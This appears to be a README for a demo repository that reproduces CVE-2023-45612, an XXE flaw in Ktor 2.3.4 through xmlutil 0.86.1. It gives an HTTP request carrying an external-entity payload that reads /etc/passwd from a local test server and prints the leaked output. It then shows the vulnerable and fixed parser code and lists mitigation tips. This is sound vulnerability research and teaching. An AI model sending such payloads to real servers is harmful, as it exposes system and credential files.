# ktor-vulnerable-demo

CVE-2023-45612 is a vulnerability related to the fact that using default configuration in one of Ktor's components results in an attacker's ability to exploit XXE injection. Down below I will continue to explain how to reproduce it, why this is a vulnerability and some mitigation techniques based on the vulnerable code.

Given the fact that I approached this CVE for the first time, along with also interacting with Ktor and Kotlin for the first time, I will also explain my thought process with how I identifies the vulnerable version in order to deploy a Ktor app that uses it.

First, it all began with a Google search: `CVE-2023-45612`, then I accessed `https://www.jetbrains.com/privacy-security/issues-fixed/`, where I found the PR with the vulnerability fix `https://github.com/ktorio/ktor/pull/3770`. The fix here was to update `xmlutil` from `0.86.1` to `0.86.2`. Actually, here, Ktor was using a dependency that was vulnerable. So I went exactly to `xmlutil` and downloaded the `0.86.1` release to analyze it further. I also checked which the latest Ktor version that used `0.86.1` was and found it to be `Ktor 2.3.4`. I also downloaded that and started analyzing the code.

I will not go into the code details of the vulnerability, I will just mention that the vulnerability occurs because `XMLInputFactory.newFactory()` creates a factory with **external entity processing enabled by default**, allowing XXE attacks when processing XML content through Ktor's ContentNegotiation plugin.

Continuing with how to actually reproduce it, I began searching how to set up a project that uses Ktor and also analyzed `xmlutil 0.86.2` to see how it tested for XXE in the fixed version. I set up a GitHub repo from which you can pull the code.

```

git clone https://github.com/cristibtz/ktor-vulnerable-demo.git

cd ktor-vulnerable-demo

./gradlew build && ./gradlew run

```

I think it's worth mentioning the specs of my environment, because I found myself having some errors in the process of running the app, because of lack of experience with Java, Gradle, etc. But I got it working with these specs.

```

Java & Environment Specifications

Java Runtime

- Java Version: OpenJDK 21.0.8 (LTS)

- Java Distribution: OpenJDK (Ubuntu build)

- Build: 21.0.8+9-Ubuntu-0ubuntu124.04.1

- VM: OpenJDK 64-Bit Server VM

- Target JVM: 1.8

Build Tools

- Gradle Version: 7.6.1

- Gradle Wrapper: 7.6.1-bin

- Kotlin Version: 1.8.22

Framework Versions

- Ktor Version: 2.3.4 (vulnerable version)

- XMLUtil Version: 0.86.1 (vulnerable)

- Kotlinx Serialization: 1.5.1

Operating System

- OS: Linux (Ubuntu 24.04)

- Kernel: 6.8.0-79-generic amd64

- Architecture: x86_64

```

Now, after the app is running, I personally used Burp Suite for exploitation, sending the following request:

```Request

POST /data HTTP/1.1

Host: localhost:8880

Content-Type: application/xml

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36

Content-Length: 58

<SimpleData>

<value>

Hello

</value>

</SimpleData>

```

Response

```Response

HTTP/1.1 200 OK

Content-Length: 76

Content-Type: text/plain; charset=UTF-8

Data processed:

Hello

Normal data

```

Now, to test for XXE, I used this request, with the classical read from `/etc/passwd`:

```Request

POST /data HTTP/1.1

Host: localhost:8880

Content-Type: application/xml

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36

Content-Length: 142

<!DOCTYPE foo [

<!ELEMENT foo ANY >

<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>

<SimpleData>

<value>

&xxe;

</value>

</SimpleData>

```

Response

```Response

HTTP/1.1 200 OK

Content-Length: 1914

Content-Type: text/plain; charset=UTF-8

Data processed:

root:x:0:0:root:/root:/bin/bash

daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

bin:x:2:2:bin:/bin:/usr/sbin/nologin

sys:x:3:3:sys:/dev:/usr/sbin/nologin

sync:x:4:65534:sync:/bin:/bin/sync

games:x:5:60:games:/usr/games:/usr/sbin/nologin

...

XXE SUCCESS!

```

And this is a simple PoC for CVE-2023-45612, taking advantage of a simple misconfiguration, which I will explain briefly below.

As I said above, the vulnerability is located in `xmlutil-0.86.1`, file `StAXReader.kt`, line `47`(even though there are three vulnerable constructors on the following lines, we'll talk about line `47` only).

```

@Throws(XMLStreamException::class)

public constructor(source: Source) : this(XMLInputFactory.newFactory().createXMLStreamReader(source))

```

In the following version `xmlutil-0.86.2` this line was replaced with

```

@Throws(XMLStreamException::class)

public constructor(reader: Reader) : this(safeInputFactory().createXMLStreamReader(reader))

```

which represents a safe way to parse XML, because it doesn't allow the parsing of external entities by default.

```kotlin

private fun safeInputFactory(): XMLInputFactory {
	return XMLInputFactory.newFactory().apply {
	setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false)
	setProperty(XMLInputFactory.SUPPORT_DTD, false)
	}
}

```

To help mitigate these kinds of problems in the future, I would recommend to developers the following tips:

* Always make sure to disable External Entities and DTDs regardless of the parser used, if they are not expected as input

* If XML is not a must, use JSON because it doesn't include external entities at all.

* Validate the input against a strict schema that defines expected data types and patterns. Always escape characters like `<`, `>` or `&`

* Regularly update libraries, as it was the case here, to avoid using outdated and vulnerable libraries

* Use SAST techniques to occasionally analyze the used libraries' code

As a summary, I explained my thought process of identifying, beginning with CVE-2023-45612, the vulnerable versions and the vulnerable chain, starting from Ktor's ContentNegotiation.kt up until xmlutil-0.86.1 StAXReader.kt. Then, I showed a simple PoC that allowed me to read /etc/passwd and ending with some useful tips for developers to be able to avoid such vulnerabilities in the future.
